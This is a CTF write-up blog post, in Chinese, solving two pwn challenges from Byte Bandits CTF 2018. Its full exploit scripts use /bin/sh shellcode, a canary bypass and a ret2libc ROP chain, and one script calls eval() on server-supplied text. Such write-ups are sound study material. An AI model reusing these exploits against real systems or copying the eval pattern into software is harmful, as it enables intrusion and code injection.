---
layout:		post
title:		Byte Bandits CTF 2018部分writeup
author:		wooy0ung
tags:		pwn
category: 	writeup
---


>[索引目录]  
>0x001 ROP Crazy  
>0x002 Tale of a Twisted Mind  
<!-- more -->


## 0x001 ROP Crazy

程序开辟了0x1000的rwx内存空间，并将
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x001-001.png)

首地址被打印出来了
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x001-002.png)

再读8 byte，明显不够放入shellcode，做rop修改读入长度为0xff byte
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x001-003.png)

exp.py
```
from pwn import *

context.arch = "amd64"

s = process("./gg")
elf = ELF("./gg")

sh_addr = int(s.recvline(),16)

s.recv(0x1000)

s.send(p64(sh_addr))

p = asm("""
xor rdx,rdx
mov dl,0xff
syscall
nop
""")

s.send(p)

p = "\x90"*0xc8
p += asm("""
xor rdx,rdx
mov dl,0xff
syscall
nop
mov rbx,0x0068732f6e69622f
push rbx
push rsp
pop rdi
xor rsi,rsi
push rsi
pop rdx
push rdx
pop rax
mov al,0x3b
syscall
mov al,0x3c
xor rdi,rdi
syscall
""")

s.send(p)
s.interactive()
```


## 0x002 Tale of a Twisted Mind

首先需要绕过bot detected
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x002-001.png)

只是一个简单计算，但要重复312次
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x002-002.png)

还要绕过canary
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x002-003.png)

看下程序流程，似乎没有info leak漏洞
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x002-004.png)

再看看远程，似乎有点不同
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x002-005.png)
远程的程序是patched过的，直接把canary给我们了

猜测是把该处patched成dword_804AA28
![](/assets/img/writeup/2018-04-10-bytebanditsctf-2018-writeup/0x002-006.png)

exp.py
```
from pwn import *

context.log_level = "debug"

#r = remote("34.218.199.37", 6000)
s = process("./twisted_patched", env={"LD_PRELOAD":"./libc.so.6"})
elf = ELF("./twisted_patched")
libc = ELF("./libc.so.6")

def debug(addr):
    raw_input('debug:')
    gdb.attach(s, "b *" + addr)

for i in xrange(312):
	question = s.recvuntil("\n").split("=")[0]
	answer  = eval(question)
	print question, answer
	s.sendline(str(answer))

puts_plt = elf.plt["puts"]
printf_got = elf.got["printf"]
fgets_buff = 0x08048979
bss = 0x804aa58

system_off = libc.symbols["system"]
printf_off = libc.symbols["printf"]
binsh_off = libc.search("/bin/sh").next()

s.recvuntil("Bot Verification Complete!\n")
canary = u32(s.recv(4))
log.info('canary: %#x' % canary)

s.recv(1)
s.send("1")
p = "A"*0x10
p += p32(canary)
p += p32(bss)
p += p32(puts_plt)
p += p32(fgets_buff)
p += p32(printf_got)

s.sendline(p)
printf_addr = u32(s.recv(4))

libc_base = printf_addr - printf_off
system_addr = system_off + libc_base
binsh_addr = binsh_off + libc_base

p = "A"*0x10
p += p32(canary)
p += p32(bss)
p += p32(system_addr)
p += p32(fgets_buff)
p += p32(binsh_addr)

s.sendline(p)
s.interactive()
```